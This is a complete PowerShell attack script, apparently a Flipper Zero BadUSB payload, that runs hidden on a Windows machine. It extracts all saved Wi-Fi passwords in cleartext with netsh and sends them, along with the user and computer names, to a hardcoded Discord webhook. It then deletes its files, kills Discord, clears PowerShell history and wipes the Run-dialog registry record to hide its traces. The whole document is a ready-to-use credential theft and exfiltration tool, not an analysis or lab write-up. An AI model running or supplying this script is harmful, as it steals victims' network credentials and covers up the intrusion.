PowerShell.exe -WindowStyle hidden {

#CHANGE URL TO YOUR URL
  $url="https://discord.com/api/webhooks/1218944540405268643/nyDFOGn5KUvkNaf0yZSLjcoJyYTm6eQj5ZwZBuBj4D8Q8cZ9JPHqJ0rNLugT3AqZ3b9p" ;
#Get PC Name+Date+Time
  $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"
# Get WifiPassword
  echo "" > "$env:temp\WIFI-$namepc.txt";
  (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | out-file "$env:temp\WIFI-$namepc.txt";
#UPLOAD
  cd $env:temp
# Send Name Computer to discord
  $Body=@{ content = "**WIFI from Flipper-Zero on user:** $env:UserName, on pc: $env:computername"};
  Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
# Upload wifi password
  curl.exe -F "file2=@WIFI-$namepc.txt" $url;
# Delete wifi password#
  Remove-Item "WIFI-$namepc.txt" -Force -Recurse;#
# Delete this script
  Remove-Item  $env:temp\d.ps1 -Force -Recurse;
  Remove-Item  $env:temp\p.ps1 -Force -Recurse;
#Last discord kill before quit
  taskkill /IM Discord.exe /F
# Clear History powershell
  [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
# Clear run powershell
  Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU;
}